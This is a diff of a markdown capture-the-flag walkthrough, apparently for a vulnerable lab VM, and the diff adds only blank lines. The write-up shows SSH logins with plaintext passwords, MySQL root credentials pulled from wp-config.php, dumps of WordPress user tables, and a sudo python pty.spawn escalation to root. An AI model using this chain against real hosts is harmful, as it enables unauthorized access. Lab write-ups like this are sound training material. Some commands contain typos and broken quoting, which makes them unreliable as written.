@@ -54,7 +54,9 @@ password: michael
 `flag2.txt`:
 
     -Flage 2 was found in following directories:
+     
      Command: cd /var/www/
+            
             : ls -al
 
 ![](images/flag2.png)
@@ -66,6 +68,7 @@ Mysql server login credentials was listed in wp-config.php file from where steve
 
 Step 1:
 -SSH into Michael account
+
 command: ssh micheal@192.168.1.110
 
 -Login credentials using MYSQL server, were found in wp-config.php file within var/www/html/wordpress directory.
@@ -74,10 +77,15 @@ command: ssh micheal@192.168.1.110
 
 
 Command: mysql -u root -p
+
 password: R@v3nSecurity
+  
   mysql> use wordpress;
+        
         show table;
+        
         SELECT * FROM wp_users;
+        
         SELECT * FROM wp_posts;
 
 ![](images/WP-TABLE.png)
@@ -91,12 +99,19 @@ user steven password is cracked: pink84
 
 Step 3:
 Once the password hash was cracked, then SSH into Steven to execute python to escalte root privilege
+
 Command: ssh steven@192.168.1.110
+
 password: pink84
+        
         :sudo -l
+        
         :sudo python -c 'import pty;pty.spawn ('/bin/bash");'
+        
         :cd /root
+        
         :ls -al
+        
         :cat falg4.txt
         
 ![](images/flag4.png)
